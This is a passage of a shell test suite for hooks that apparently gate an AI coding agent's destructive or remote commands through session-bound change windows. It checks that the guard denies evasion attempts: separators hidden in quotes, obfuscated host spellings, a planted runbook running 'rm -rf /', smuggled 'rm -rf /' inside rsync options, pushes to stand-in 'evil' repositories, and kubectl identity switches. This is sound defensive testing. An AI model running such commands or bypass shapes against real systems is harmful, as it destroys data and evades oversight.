  r="$(reason)"
  printf '%s' "$r" | grep -qF 'CHANGE PLAN' || { echo "$r"; false; }
  printf '%s' "$r" | grep -qF 'cannot pass a change window'
  c="$(code_of "$r")"
  lib "mk_careful_pending_get $WSID $c"
  [ "$status" -eq 0 ]
}

@test "I1: no tool_use_id -> marker keyed c-<session>-<cksum of the command>" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  cmd="ssh prod.example.com 'systemctl restart x'"
  p="$(jq -nc --arg c "$cmd" --arg cwd "$PROJ" --arg s "$WSID" '{tool_name:"Bash",tool_input:{command:$c},cwd:$cwd,session_id:$s}')"
  run_hook guard-destructive.sh "$p"
  [ -z "$output" ] || { echo "$output"; false; }
  key="c-$WSID-$(printf '%s' "$cmd" | cksum | cut -d' ' -f1)"
  marker "$key"
  [ "$status" -eq 0 ] && [ "$output" = "$cmd" ] || { echo "no marker $key"; false; }
  marker "$WSID"; [ "$status" -eq 1 ]
}

@test "M1: a background deny writes the targets code to pending (main session only)" {
  mk_project "$WCFG"
  gd "ssh prod.example.com 'systemctl restart x'" toolu_bg '{"tool_input":{"run_in_background":true}}'
  [ "$(decision)" = deny ]
  lib "mk_careful_pending_get $WSID \"\$(mk_careful_targets_code host:prod.example.com)\""
  [ "$status" -eq 0 ]
  set -- $output
  [ "$3" = host:prod.example.com ]
  mk_project "$WCFG"
  gd "ssh prod.example.com 'systemctl restart x'" toolu_bg '{"tool_input":{"run_in_background":true},"agent_id":"a1"}'
  [ "$(decision)" = deny ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "S4: a window belongs to its session" {
  mk_project "$WCFG"
  lib "mk_careful_window_open other-session 30 host:prod.example.com"
  gd "ssh prod.example.com 'systemctl restart x'" toolu_s4
  [ "$(decision)" = deny ]
  printf '%s' "$(reason)" | grep -qF 'CHANGE PLAN'
  lib 'mk_careful_window_open s1 5 host:a; mk_careful_window_covers s2 host:a; echo "c=$?"; mk_careful_window_close s2; mk_careful_window_covers s1 host:a; echo "c1=$?"; mk_careful_window_close s1 boom; mk_careful_window_failed s2; echo "f2=$?"; mk_careful_window_failed s1'
  printf '%s\n' "$output" | grep -qx 'c=1'
  printf '%s\n' "$output" | grep -qx 'c1=0'
  printf '%s\n' "$output" | grep -qx 'f2=1'
  printf '%s\n' "$output" | grep -qx 'boom'
  lib 'mk_careful_window_file "a/b c"'
  case "$output" in *careful-window-a_b_c) ;; *) echo "$output"; false ;; esac
  lib 'mk_careful_window_open "" 5 host:a'; [ "$status" -eq 1 ]
}

@test "S3: pending replacement of a different unexpired code is flagged on the expiry" {
  lib 'mk_careful_pending_set s1 aaaaaa "host:a"; mk_careful_pending_get s1'
  set -- $output
  [ "$1" = aaaaaa ] && [ "${2%!}" = "$2" ] && [ "$3" = host:a ]
  lib 'mk_careful_pending_set s1 bbbbbb "host:b"; mk_careful_pending_get s1 bbbbbb'
  set -- $output
  [ "$1" = bbbbbb ] && [ "${2%!}" != "$2" ] && [ "$3" = host:b ]
  # the same code again keeps the flag; the line still matches its code
  lib 'mk_careful_pending_set s1 bbbbbb "host:b"; mk_careful_pending_get s1 bbbbbb'
  set -- $output
  [ "${2%!}" != "$2" ]
  # a new session, or a replacement after expiry, is not flagged
  lib 'mk_careful_pending_set s2 cccccc; mk_careful_pending_set s2 cccccc; mk_careful_pending_get s2'
  set -- $output
  [ "${2%!}" = "$2" ] && [ "$#" -eq 2 ]
  lib 'MK_CF_TTL=-1; mk_careful_pending_set s3 aaaaaa; MK_CF_TTL=600; mk_careful_pending_set s3 bbbbbb; mk_careful_pending_get s3'
  set -- $output
  [ "$1" = bbbbbb ] && [ "${2%!}" = "$2" ]
  # a flagged expiry that is garbage still fails closed
  lib 'f="$(mk_careful_pending_file s4)"; ( umask 077; printf "abc123 12x! host:a\n" > "$f" ); mk_careful_pending_get s4'
  [ "$status" -eq 1 ]
}

@test "S2: Edit/Write of the pending or window files is denied (any case, through symlinks)" {
  mk_project "$WCFG"
  local p
  for p in "/tmp/memokit-1-careful-pending-s1" "/tmp/memokit-1-Careful-Window-s1" \
           "/tmp/memokit-1-careful-window-running-x" "/tmp/memokit-1-CAREFUL-GRANTS" \
           "/tmp/memokit-1-careful-active-s1" "/tmp/memokit-1-Careful-Active-x"; do
    run_hook guard-destructive.sh "$(write_payload "$p")"
    [ "$(decision)" = deny ] || { echo "write allowed: $p"; false; }
  done
  ln -s "/tmp/memokit-1-careful-window-s1" "$PROJ/link"
  run_hook guard-destructive.sh "$(write_payload "$PROJ/link")"
  [ "$(decision)" = deny ]
  run_hook guard-destructive.sh "$(write_payload "$PROJ/src/a.txt")"
  [ -z "$output" ]
}

# --- fix round 2: the remote scan is bounded (MK_RM_MAX_CHARS 8 KiB,
# MK_RM_MAX_SEG_CHARS 4 KiB); past it the command is too-large ---

@test "bound: a 60 KB single ssh line is too-large, fast, never passes a covering window" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  pad="$(head -c 60000 /dev/zero | tr '\0' a)"
  s=$SECONDS
  gd "ssh prod.example.com 'echo $pad > /tmp/x'" toolu_big
  [ $((SECONDS - s)) -le 2 ] || { echo "took $((SECONDS - s)) s"; false; }
  [ "$(decision)" = deny ]
  r="$(reason)"
  printf '%s' "$r" | grep -qF 'too-large' || { echo "$r"; false; }
  lacks "$r" 'CHANGE PLAN'
  [ -n "$(code_of "$r")" ]
  marker toolu_big; [ "$status" -eq 1 ]
  # a 5 KB single segment (under 8 KiB, over the 4 KiB segment bound) too
  pad="$(head -c 5000 /dev/zero | tr '\0' a)"
  gd "ssh prod.example.com 'echo $pad > /tmp/x'" toolu_big2
  printf '%s' "$(reason)" | grep -qF 'too-large'
  marker toolu_big2; [ "$status" -eq 1 ]
}

@test "bound: a 7 KB command of segments under 4 KiB still works normally" {
  mk_project "$WCFG"
  pad="$(head -c 3400 /dev/zero | tr '\0' a)"
  c="ssh prod.example.com 'systemctl restart $pad' && ssh prod.example.com 'systemctl restart x$pad'"
  [ "${#c}" -gt 6800 ] && [ "${#c}" -le 8192 ]
  gd "$c" toolu_7k
  [ "$(decision)" = deny ]
  r="$(reason)"
  printf '%s' "$r" | grep -qF 'remote-mutate → host:prod.example.com' || { echo "$r"; false; }
  lacks "$r" 'too-large'
  printf '%s' "$r" | grep -qF 'CHANGE PLAN'
  open_window 'host:prod.example.com'
  s=$SECONDS
  gd "$c" toolu_7k2
  [ $((SECONDS - s)) -le 2 ] || { echo "took $((SECONDS - s)) s"; false; }
  [ -z "$output" ] || { echo "$output"; false; }
  marker toolu_7k2; [ "$status" -eq 0 ]
}

# --- fix round 3: the scan also parses the unsplit command, so a separator
# inside quotes cannot hide a host ---

@test "round 3: quoted separators cannot hide a host (labelled outside a window, denied inside)" {
  mk_project "$WCFG"
  local c n=0
  for c in "ssh -o 'User=x;' prod.example.com 'systemctl restart x'" \
           "ssh -o 'ProxyCommand=x|y' prod.example.com z" \
           "scp 'a;b' prod.example.com:/x" \
           "rsync -e 'ssh -p 22; rm -rf /' ./ prod.example.com:/x" \
           "ssh -o 'User=x&&y' prod.example.com 'systemctl restart x'"; do
    n=$((n + 1))
    gd "$c" "toolu_q$n"
    [ "$(decision)" = deny ] || { echo "not labelled: $c"; false; }
    printf '%s' "$(reason)" | grep -qF 'host:prod.example.com' || { echo "no host target: $c -> $(reason)"; false; }
  done
  open_window 'host:prod.example.com'
  in_window_denied toolu_qw \
    "ssh -o 'User=x;' prod.example.com 'systemctl restart x'" \
    "ssh -o 'ProxyCommand=x|y' prod.example.com z" \
    "rsync -e 'ssh -p 22; rm -rf /' ./ prod.example.com:/x" \
    "ssh -o Hostname=31.210.53.162 prod.example.com 'systemctl restart x'" \
    "ssh -o HostName=prod.example.com prod.example.com 'systemctl restart x'" \
    "ssh '-o ProxyCommand=x' prod.example.com y" \
    "ssh '-oUser=a' prod.example.com 'systemctl restart x'" \
    "rsync '-e' 'ssh -p 22 ; rm -rf /' ./ prod.example.com:/x" \
    "rsync -- -e 'sh -c x' ./ prod.example.com:/x" \
    "rsync '--' -e ssh ./ prod.example.com:/x" \
    "rsync --exclude='a b' ./ prod.example.com:/x" \
    "ssh prod.example.com x 2>&10" \
    "ssh prod.example.com x >&2x" \
    "ssh prod.example.com x 2>&1foo" \
    "ssh -p '22 -F x' prod.example.com y" \
    "ssh -l 'a;b' prod.example.com 'systemctl restart x'"
  # the allowed shapes still pass
  gd "rsync -az -e 'ssh -p 2222' ./dist/ prod.example.com:/srv/app/" toolu_qok1
  [ -z "$output" ] || { echo "$output"; false; }
  gd "ssh prod.example.com 'systemctl --no-pager restart x' 2>&1" toolu_qok2
  [ -z "$output" ] || { echo "$output"; false; }
  gd "scp 'a;b' prod.example.com:/x" toolu_qok3
  [ -z "$output" ] || { echo "a quoted file name is a plain value: $output"; false; }
}

@test "round 3: a kubectl subcommand hidden in a quoted span is refused" {
  mk_project "$WCFG"
  open_window 'k8s'
  gd "kubectl apply -f k.yaml" toolu_k0
  [ -z "$output" ] || { echo "$output"; false; }
  in_window_denied toolu_k1 \
    "kubectl 'apply -f' k.yaml" \
    "kubectl -n 'a b' apply -f k.yaml" \
    "helm 'upgrade app' ./chart"
}

@test "round 3: the unsplit pass keeps the scan under 1.5 s for an 8 KB command" {
  mk_project "$WCFG"
  c=""; i=0; p="$(head -c 140 /dev/zero | tr '\0' b)"
  while [ "$i" -lt 40 ]; do c="${c}ssh -o 'User=x;' prod.example.com 'systemctl restart a$i$p'
"; i=$((i + 1)); done
  [ "${#c}" -le 8192 ]
  s=$SECONDS
  gd "$c" toolu_q8k
  [ $((SECONDS - s)) -le 2 ] || { echo "took $((SECONDS - s)) s"; false; }
  [ "$(decision)" = deny ]
}

# --- fix round 4: hard budget (fail closed), structural bounds, one scan,
# glob / runbook / k8s / repository rules in the window pass ---

# burn MODE CMD TUID -- run the hook with the test-only MEMOKIT_TEST_BURN hook.
burn() { export MEMOKIT_TEST_BURN="$1"; gd "$2" "$3"; unset MEMOKIT_TEST_BURN; }
RB=.claude/memokit/runbooks/deploy.sh
mk_runbook() {
  mkdir -p "$PROJ/.claude/memokit/runbooks"
  printf '#!/bin/sh\necho deploy "$1"\n' > "$PROJ/$RB"
  RB_SHA="$({ sha256sum 2>/dev/null || shasum -a 256; } < "$PROJ/$RB" | cut -d' ' -f1)"
}

@test "round 4: a guard that runs out of time or crashes denies (never lets the command through)" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  local m
  # 1: spin in the hook process (wall-clock watchdog); sub: spin inside a
  # command substitution the hook is waiting on (the watchdog kills the
  # tree); cpu: spin with no watchdog (the XCPU trap alone)
  for m in 1 sub cpu; do
    s=$SECONDS
    burn "$m" "ssh prod.example.com 'systemctl restart x'" "toolu_burn$m"
    # the watchdog (1, sub) answers at 3.3 s; cpu has no watchdog and waits
    # for 4 s of CPU time, slower in wall time on a loaded machine
    lim=4; [ "$m" = cpu ] && lim=5
    [ $((SECONDS - s)) -le "$lim" ] || { echo "mode $m took $((SECONDS - s)) s"; false; }
    [ "$(decision)" = deny ] || { echo "mode $m: [$output]"; false; }
    printf '%s' "$(reason)" | grep -qF 'ran out of time' || { echo "mode $m: $(reason)"; false; }
    marker "toolu_burn$m"; [ "$status" -eq 1 ]
  done
  # crash: an unbound variable under set -u ends the hook early: still a deny
  # (run_hook merges bash's error line on stderr into $output)
  burn crash "ssh prod.example.com 'systemctl restart x'" toolu_crash
  printf '%s' "$output" | grep -qF '"permissionDecision": "deny"' || { echo "crash: [$output]"; false; }
  printf '%s' "$output" | grep -qF 'could not finish'
  marker toolu_crash; [ "$status" -eq 1 ]
  # without the test hook the same command passes the window
  gd "ssh prod.example.com 'systemctl restart x'" toolu_nob
  [ -z "$output" ] || { echo "$output"; false; }
  # addendum 4: a watchdog that fires after the decision changes nothing: a
  # pass stays silent, a deny is printed exactly once
  burn late "ssh prod.example.com 'systemctl restart x'" toolu_late1
  [ "$status" -eq 0 ] && [ -z "$output" ] || { echo "late pass: [$output]"; false; }
  burn late "rm -rf ./data" toolu_late2
  [ "$(printf '%s\n' "$output" | grep -c '"permissionDecision"')" -eq 1 ] || { echo "late deny: [$output]"; false; }
  printf '%s' "$(reason)" | grep -qF 'rm-recursive'
  lacks "$output" 'ran out of time'
  # round 5: the watchdog firing between "decided" (a deny chosen, TERM
  # already ignored) and "printed" changes nothing either: the chosen deny
  # is printed once, not the budget deny
  burn late2 "rm -rf ./data" toolu_late3
  [ "$(printf '%s\n' "$output" | grep -c '"permissionDecision"')" -eq 1 ] || { echo "late2 deny: [$output]"; false; }
  printf '%s' "$(reason)" | grep -qF 'rm-recursive'
  lacks "$output" 'ran out of time'
  burn late2 "ssh prod.example.com 'systemctl restart x'" toolu_late4
  [ "$status" -eq 0 ] && [ -z "$output" ] || { echo "late2 pass: [$output]"; false; }
  # normalised spellings are denied by the hook too (no window)
  gd "s\\sh pro\\d.example.com 'systemctl restart x'" toolu_n1
  [ "$(decision)" = deny ] || { echo "backslash spelling passed"; false; }
  printf '%s' "$(reason)" | grep -qF 'host:prod.example.com'
  gd "\$'\\x73sh' \$'prod\\x2eexample.com' 'systemctl restart x'" toolu_n2
  [ "$(decision)" = deny ] || { echo "ANSI-C spelling passed"; false; }
}

@test "round 4: the review's slow commands are too-large and fast, in and out of a window" {
  mk_project "$WCFG"
  local c i pad
  c="rm -rf ./data; echo"; i=0; while [ "$i" -lt 400 ]; do c="$c ssh"; i=$((i + 1)); done
  s=$SECONDS; gd "$c" toolu_s1
  [ $((SECONDS - s)) -le 2 ] || { echo "400 ssh words took $((SECONDS - s)) s"; false; }
  [ "$(decision)" = deny ]; printf '%s' "$(reason)" | grep -qF 'too-large'
  c="rm -rf ./data; echo"; i=0; while [ "$i" -lt 1000 ]; do c="$c ssh"; i=$((i + 1)); done
  s=$SECONDS; gd "$c" toolu_s2
  [ $((SECONDS - s)) -le 2 ] || { echo "1000 ssh words took $((SECONDS - s)) s"; false; }
  [ "$(decision)" = deny ]; printf '%s' "$(reason)" | grep -qF 'too-large'
  c="ssh prod.example.com touch"; while [ "${#c}" -lt 4083 ]; do c="$c ssh"; done
  s=$SECONDS; gd "$c" toolu_s3
  [ $((SECONDS - s)) -le 2 ] || { echo "4 KB segment took $((SECONDS - s)) s"; false; }
  [ "$(decision)" = deny ]; printf '%s' "$(reason)" | grep -qF 'too-large'
  open_window 'host:prod.example.com'
  pad=""; i=0; while [ "$i" -lt 2000 ]; do pad="$pad''"; i=$((i + 1)); done
  c="ssh prod.example.com x $pad && ssh prod.example.com y $pad"
  [ "${#c}" -le 8192 ]
  s=$SECONDS; gd "$c" toolu_s4
  [ $((SECONDS - s)) -le 2 ] || { echo "two 4 KB quote segments took $((SECONDS - s)) s"; false; }
  [ "$(decision)" = deny ] || { echo "passed: $c"; false; }
  printf '%s' "$(reason)" | grep -qF 'too-large'
  marker toolu_s4; [ "$status" -eq 1 ]
  # the 20-segment chain still passes, within the budget
  c=""; i=0; while [ "$i" -lt 20 ]; do c="$c${c:+ && }ssh prod.example.com 'systemctl restart a$i'"; i=$((i + 1)); done
  s=$SECONDS; gd "$c" toolu_s5
  [ $((SECONDS - s)) -le 2 ] || { echo "20-segment chain took $((SECONDS - s)) s"; false; }
  [ -z "$output" ] || { echo "$output"; false; }
}

@test "round 4: an unquoted glob never reaches a covered segment" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  in_window_denied toolu_gl \
    "ssh * prod.example.com 'systemctl restart x'" \
    "ssh ?* prod.example.com 'systemctl restart x'" \
    "ssh [-]* prod.example.com 'systemctl restart x'" \
    "rsync -az * prod.example.com:/srv/app/" \
    "scp * prod.example.com:/srv/" \
    "rsync -az --exclude=*.log ./dist/ prod.example.com:/srv/app/" \
    "rsync -az --exclude '*.log' ./dist/* prod.example.com:/srv/app/" \
    "scp '*' prod.example.com:/srv/" \
    "scp ./dist/[a]* prod.example.com:/srv/" \
    "ssh prod.example.com 'systemctl restart x' 2>&1 *"
  local c n=0
  for c in "ssh prod.example.com 'rm -rf /srv/app/releases/*'" \
           "ssh prod.example.com 'ls /srv/?/[ab]*; systemctl restart x'" \
           "rsync -az --exclude='*.log' --include '?.txt' ./dist/ prod.example.com:/srv/app/" \
           "rsync -az --exclude \"[ab]*\" ./dist/ prod.example.com:/srv/app/"; do
    n=$((n + 1))
    gd "$c" "toolu_glok$n"
    [ -z "$output" ] || { echo "denied: $c -> $output"; false; }
  done
}

@test "round 4: a runbook path is resolved against the payload cwd and must land in runbooksDir" {
  mk_project "$WCFG"; mk_runbook
  open_window "runbook:$RB@$RB_SHA"
  gd "bash $RB" toolu_rb1
  [ -z "$output" ] || { echo "$output"; false; }
  marker toolu_rb1; [ "$status" -eq 0 ]
  gd "sudo bash $RB" toolu_rb2
  [ -z "$output" ] || { echo "sudo bash: $output"; false; }
  gd "./$RB" toolu_rb3
  [ -z "$output" ] || { echo "./path: $output"; false; }
  # a planted copy under src/: with cwd src the same relative path runs it
  mkdir -p "$PROJ/src/.claude/memokit/runbooks"
  printf '#!/bin/sh\nrm -rf /\n' > "$PROJ/src/$RB"
  gd "bash $RB" toolu_rb4 '{"cwd":"'"$PROJ/src"'"}'
  [ "$(decision)" = deny ] || { echo "planted runbook passed"; false; }
  marker toolu_rb4; [ "$status" -eq 1 ]
  gd "bash ./$RB" toolu_rb5 '{"cwd":"'"$PROJ/src"'"}'
  [ "$(decision)" = deny ]
  gd "$RB" toolu_rb6 '{"cwd":"'"$PROJ/src"'"}'
  [ "$(decision)" = deny ]
  # no cwd in the payload: nothing to resolve against, denied
  gd "bash $RB" toolu_rb7 '{"cwd":null}'
  [ "$(decision)" = deny ]
  marker toolu_rb7; [ "$status" -eq 1 ]
  # a cwd inside the repo that is not the root still resolves correctly
  gd "bash ../$RB" toolu_rb8 '{"cwd":"'"$PROJ/src"'"}'
  [ "$(decision)" = deny ]
  # addendum 4: a runbook passes only as the only segment (another segment
  # could rewrite the file between the hash check and the run)
  gd "bash $RB prod" toolu_rb9
  [ -z "$output" ] || { echo "single runbook segment denied: $output"; false; }
  in_window_denied toolu_rb10 \
    "cp ./evil.sh $RB && bash $RB" \
    "cp ./evil.sh $RB; bash $RB" \
    "cp ./evil.sh $RB
bash $RB" \
    "bash $RB && echo done" \
    "echo start; sudo bash $RB"
  gd "cp ./evil.sh $RB && bash $RB" toolu_rb11
  printf '%s' "$(reason)" | grep -qF 'cannot pass a change window' || { echo "$(reason)"; false; }
}

@test "round 4: kubectl/helm target options are denied in a window; --context keeps working" {
  mk_project "$WCFG"
  open_window 'k8s
k8s:prod'
  local c n=0
  for c in "kubectl apply -f k.yaml" \
           "kubectl --context prod apply -f k.yaml" \
           "kubectl --context=prod -n app apply -f k.yaml" \
           "helm --kube-context prod upgrade app ./chart"; do
    n=$((n + 1))
    gd "$c" "toolu_kok$n"
    [ -z "$output" ] || { echo "denied: $c -> $output"; false; }
  done
  in_window_denied toolu_kd \
    "kubectl --cluster other apply -f k.yaml" \
    "kubectl --cluster=other apply -f k.yaml" \
    "kubectl apply -f k.yaml --cluster other" \
    "kubectl --server https://other:6443 apply -f k.yaml" \
    "kubectl -s https://other:6443 apply -f k.yaml" \
    "kubectl --user other apply -f k.yaml" \
    "kubectl --token=x apply -f k.yaml" \
    "kubectl --username u --password p apply -f k.yaml" \
    "kubectl --client-certificate /c --client-key=/k apply -f k.yaml" \
    "kubectl --certificate-authority /ca apply -f k.yaml" \
    "kubectl --insecure-skip-tls-verify apply -f k.yaml" \
    "kubectl --as admin apply -f k.yaml" \
    "kubectl --as-group g apply -f k.yaml" \
    "kubectl --tls-server-name x apply -f k.yaml" \
    "helm upgrade app ./chart --kube-apiserver https://other" \
    "helm --kube-token x upgrade app ./chart" \
    "helm upgrade app ./chart --kube-ca-file /x" \
    "helm --kube-as-user root upgrade app ./chart" \
    "helm --kube-insecure-skip-tls-verify upgrade app ./chart"
}

@test "round 4: git push only to a configured remote name; gh never with --repo / -R / GH_REPO" {
  mk_project "$WCFG"
  git -C "$PROJ" remote add origin https://example.com/x.git
  open_window "$all_targets"
  local c n=0
  for c in "git push origin deploy" \
           "git push -u origin deploy" \
           "git push --force-with-lease origin HEAD:deploy" \
           "git -C $PROJ push origin deploy" \
           "gh pr merge 12 --squash" \
           "gh workflow run deploy.yml --ref main"; do
    n=$((n + 1))
    gd "$c" "toolu_rok$n"
    [ -z "$output" ] || { echo "denied: $c -> $output"; false; }
  done
  in_window_denied toolu_rd \
    "git push https://example.org/evil/x.git deploy" \
    "git push ../elsewhere deploy" \
    "git push ./elsewhere deploy" \
    "git push .. deploy" \
    "git push upstream deploy" \
    "git push git@example.org:evil/x.git deploy" \
    "git push" \
    "git push -f" \
    "git push deploy" \
    "gh pr merge 12 --repo other/repo" \
    "gh pr merge 12 --repo=other/repo" \
    "gh pr merge 12 -R evil/x --admin" \
    "gh pr merge 12 -Revil/x" \
    "gh workflow run deploy.yml -R other/repo --ref main" \
    "GH_REPO=other/repo gh pr merge 12" \
    "env GH_REPO=other/repo gh pr merge 12" \
    "gh pr merge https://github.com/o/r/pull/12" \
    "gh pr merge o/r#12" \
    "gh workflow run deploy.yml --ref refs/heads/main" \
    "gh workflow run https://github.com/o/r/actions/workflows/deploy.yml"
  # addendum 3: the pass is bound to the project repository through the
  # payload cwd (gh and a git push without -C use the cwd's repository)
  other="$(mktemp -d "${MK_FIXTMP}/other.XXXXXX")"
  git -C "$other" init -q
  git -C "$other" remote add origin https://example.org/evil/x.git
  gd "git push origin deploy" toolu_cw1 '{"cwd":"'"$other"'"}'
  [ "$(decision)" = deny ] || { echo "push from another repo passed"; false; }
  marker toolu_cw1; [ "$status" -eq 1 ]
  gd "gh pr merge 12" toolu_cw2 '{"cwd":"'"$other"'"}'
  [ "$(decision)" = deny ] || { echo "gh from another repo passed"; false; }
  gd "git push origin deploy" toolu_cw3 '{"cwd":null}'
  [ "$(decision)" = deny ]
  gd "gh workflow run deploy.yml --ref main" toolu_cw4 '{"cwd":null}'
  [ "$(decision)" = deny ]
  # a cwd below the root is inside the repository
  gd "git push origin deploy" toolu_cw5 '{"cwd":"'"$PROJ/src"'"}'
  [ -z "$output" ] || { echo "push from src denied: $output"; false; }
  gd "gh pr merge 12 --squash" toolu_cw6 '{"cwd":"'"$PROJ/src"'"}'
  [ -z "$output" ] || { echo "gh from src denied: $output"; false; }
  # addendum 5: a NESTED repository under the root, with its own origin, is
  # not the project repository (git-common-dir differs)
  mkdir -p "$PROJ/nested"
  git -C "$PROJ/nested" init -q
  git -C "$PROJ/nested" remote add origin https://example.org/evil/x.git
  gd "git push origin deploy" toolu_cw7 '{"cwd":"'"$PROJ/nested"'"}'
  [ "$(decision)" = deny ] || { echo "push from a nested repo passed"; false; }
  marker toolu_cw7; [ "$status" -eq 1 ]
  gd "gh pr merge 12" toolu_cw8 '{"cwd":"'"$PROJ/nested"'"}'
  [ "$(decision)" = deny ] || { echo "gh from a nested repo passed"; false; }
  gd "git -C $PROJ/nested push origin deploy" toolu_cw9
  [ "$(decision)" = deny ]
}

@test "0.8.1: a window never covers a git push that deletes or mirrors refs" {
  mk_project "$WCFG"
  git -C "$PROJ" remote add origin https://example.com/x.git
  open_window "$all_targets"
  local c n=0
  for c in "git push origin deploy" "git push -u origin HEAD:deploy" "git push -f origin deploy" \
           "git push -u origin deploy" "git push --force-with-lease origin deploy" \
           "git push --force-with-lease=deploy:abc123 origin deploy" \
           "git push -o ci.skip origin deploy" "git push -uf origin deploy" \
           "git push --push-option=ci.skip origin deploy" "git -C $PROJ push -u origin deploy"; do
    n=$((n + 1))
    gd "$c" "toolu_dpok$n"
    [ -z "$output" ] || { echo "denied: $c -> $output"; false; }
  done
  in_window_denied toolu_dpd \
    "git push --mirror origin" \
    "git push --all origin" \
    "git push --branches origin" \
    "git push --prune origin deploy" \
    "git push --delete origin deploy" \
    "git push -d origin deploy" \
    "git push -fd origin deploy" \
    "git push origin :deploy" \
    "git push origin +:deploy" \
    "git push origin deploy :old" \
    "git push origin deploy --delete old" \
    "git push --del origin deploy" \
    "git push --dele origin deploy" \
    "git push --mir origin" \
    "git push --pru origin deploy" \
    "git push --bran origin" \
    "git push --al origin" \
    "git push -4d origin deploy" \
    "git push -d4 origin deploy" \
    "git push -u-d origin deploy" \
    "git push origin deploy -- :old" \
    "git push -o ci.skip --delete origin deploy"
}

@test "round 4: scp -r/-p pass; UserKnownHostsFile and ssh -r do not" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  gd "scp -r -p ./dist prod.example.com:/srv/app/" toolu_scp1
  [ -z "$output" ] || { echo "$output"; false; }
  gd "scp -rpq ./dist prod.example.com:/srv/app/" toolu_scp2
  [ -z "$output" ] || { echo "$output"; false; }
  in_window_denied toolu_scp3 \
    "ssh -o UserKnownHostsFile=/tmp/x prod.example.com 'systemctl restart x'" \
    "ssh -oUserKnownHostsFile=/tmp/x prod.example.com 'systemctl restart x'" \
    "ssh -r prod.example.com 'systemctl restart x'"
}

# --- close-window ---
# close-window.sh (PostToolUse / PostToolUseFailure): a failed command closes
# the session's window; the running marker written by the guard is consumed.

# cw_fail TUID [CMD] [JQ_FILTER] -- PostToolUseFailure payload from the fixture.
cw_fail() {
  local tu="$1" cmd="${2:-ssh prod.example.com 'bad'}" f="${3:-.}"
  jq -c --arg tu "$tu" --arg c "$cmd" --arg cwd "$PROJ" --arg s "$WSID" \
    '.tool_use_id=$tu | .tool_input.command=$c | .cwd=$cwd | .session_id=$s' \
    "$BATS_TEST_DIRNAME/fixtures/post-failure.json" | jq -c "$f"
}
cw_marker_put() { CW_LINE="$2" lib "printf '%s\n' \"\$CW_LINE\" > \"\$(mk_tmp 'careful-window-running-$1')\""; [ "$status" -eq 0 ]; }
cw_window_open() { lib "mk_careful_window_get $WSID >/dev/null"; [ "$status" -eq 0 ]; }
cw_window_gone() { lib "mk_careful_window_get $WSID >/dev/null"; [ "$status" -ne 0 ]; }
cw_failed() { lib "mk_careful_window_failed $WSID"; }

@test "close: PostToolUseFailure with a running marker closes the window and stores the first command line" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  cw_marker_put tu1 "ssh prod.example.com 'bad'"
  run_hook close-window.sh "$(cw_fail tu1 "ssh prod.example.com 'bad'
echo x")"
  [ "$status" -eq 0 ] && [ -z "$output" ]
  cw_window_gone
  cw_failed
  [ "$output" = "ssh prod.example.com 'bad'" ]
  marker tu1; [ "$status" -eq 1 ]
}

@test "close: PostToolUseFailure without a marker leaves the window" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  run_hook close-window.sh "$(cw_fail tu2)"
  [ "$status" -eq 0 ] && [ -z "$output" ]
  cw_window_open
  cw_failed; [ "$status" -eq 1 ]
}

@test "close: PostToolUse removes the marker and keeps the window" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  cw_marker_put tu3 "ssh prod.example.com 'ok'"
  run_hook close-window.sh "$(cw_fail tu3 x '.hook_event_name="PostToolUse" | del(.error,.is_interrupt) | .tool_response={stdout:"",stderr:"",interrupted:false}')"
  [ "$status" -eq 0 ] && [ -z "$output" ]
  cw_window_open
  marker tu3; [ "$status" -eq 1 ]
  cw_failed; [ "$status" -eq 1 ]
}

@test "close: is_interrupt true closes too" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  cw_marker_put tu4 "ssh prod.example.com 'slow'"
  run_hook close-window.sh "$(cw_fail tu4 x '.error="The user doesnt want to proceed" | .is_interrupt=true')"
  [ -z "$output" ]
  cw_window_gone
  cw_failed
  [ "$output" = "ssh prod.example.com 'slow'" ]
}

@test "close: any PostToolUseFailure with a marker closes (lowercase, no number, arbitrary text)" {
  mk_project "$WCFG"
  n=0
  for e in 'exit code 3' 'Exit code' 'Tool crashed' 'Command timed out'; do
    n=$((n + 1))
    open_window 'host:prod.example.com'
    cw_marker_put "tu5$n" "ssh prod.example.com 'x'"
    run_hook close-window.sh "$(cw_fail "tu5$n" x ".error=\"$e\"")"
    [ -z "$output" ]
    cw_window_gone
    marker "tu5$n"; [ "$status" -eq 1 ]
    cw_failed
    [ "$output" = "ssh prod.example.com 'x'" ]
  done
}

@test "close: a non-Bash tool_name is ignored (marker and window untouched)" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  cw_marker_put tu5x "ssh prod.example.com 'x'"
  run_hook close-window.sh "$(cw_fail tu5x x '.tool_name="Write"')"
  [ -z "$output" ]
  cw_window_open
  marker tu5x; [ "$status" -eq 0 ]
}

@test "close: silent without config and without payload" {
  mk_project none
  run_hook close-window.sh "$(cw_fail tu6)"
  [ "$status" -eq 0 ] && [ -z "$output" ]
  mk_project "$WCFG"
  run_hook close-window.sh ""
  [ "$status" -eq 0 ] && [ -z "$output" ]
}

@test "close: end to end, the marker written by the guard's pass path closes the window" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  gd "ssh prod.example.com 'bad'" toolu_e2e
  [ -z "$output" ]
  marker toolu_e2e; [ "$status" -eq 0 ]
  run_hook close-window.sh "$(cw_fail toolu_e2e)"
  [ -z "$output" ]
  cw_window_gone
  cw_failed
  [ "$output" = "ssh prod.example.com 'bad'" ]
  marker toolu_e2e; [ "$status" -eq 1 ]
}

@test "close: without tool_use_id the cksum key of guard and hook agree" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  run_hook guard-destructive.sh "$(tp "ssh prod.example.com 'bad'" | jq -c 'del(.tool_use_id)')"
  [ -z "$output" ]
  run_hook close-window.sh "$(cw_fail x "ssh prod.example.com 'bad'" 'del(.tool_use_id)')"
  [ -z "$output" ]
  cw_window_gone
}

@test "close: a marker of another tool_use_id is untouched" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  cw_marker_put other "ssh prod.example.com 'a'"
